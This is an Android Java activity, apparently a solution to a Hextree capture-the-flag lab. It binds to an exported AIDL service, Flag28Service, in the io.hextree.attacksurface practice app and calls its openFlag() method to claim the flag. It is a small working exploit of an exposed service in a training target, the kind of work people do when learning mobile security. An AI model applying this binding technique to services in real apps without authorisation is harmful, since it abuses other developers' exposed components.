package com.android.zerohextree;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import io.hextree.attacksurface.services.IFlag28Interface; // Make sure this import is correct

public class flag28 extends AppCompatActivity {

    private boolean isBound = false;
    private IFlag28Interface aidlService = null;

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            aidlService = IFlag28Interface.Stub.asInterface(binder);
            isBound = true;
            try {
                Log.i("flag28", "Calling openFlag()");
                aidlService.openFlag(); // 🔥 This should trigger the flag!
            } catch (RemoteException e) {
                Log.e("flag28", "RemoteException when calling openFlag()", e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            isBound = false;
            aidlService = null;
            Log.i("flag28", "Service disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag28); // Make sure this layout exists

        // Bind to Flag28Service using the fully-qualified class name
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isBound) {
            unbindService(connection);
            isBound = false;
        }
    }
}
